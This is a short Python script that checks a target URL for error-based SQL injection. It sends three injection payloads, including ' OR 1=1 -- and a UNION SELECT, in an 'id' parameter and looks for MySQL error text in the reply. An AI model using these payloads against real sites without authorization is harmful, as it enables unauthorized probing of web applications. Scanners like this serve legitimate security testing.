import requests
import sys

if len(sys.argv) != 2:
    print("Usage: python sql_scanner.py <target_url>")
    sys.exit(1)

target_url = sys.argv[1]

# Error-based SQL injection payloads
payloads = ["'", "' OR 1=1 --", "' UNION SELECT null, null --"]

print(f"🔍 Scanning {target_url} for SQL Injection...")

for payload in payloads:
    url = f"{target_url}?id={payload}"
    response = requests.get(url)

    if "SQL syntax" in response.text or "mysql_fetch_array()" in response.text:
        print(f"🔥 Vulnerable to SQL Injection: {url}")
        break
else:
    print("✅ No SQL Injection vulnerabilities found.")
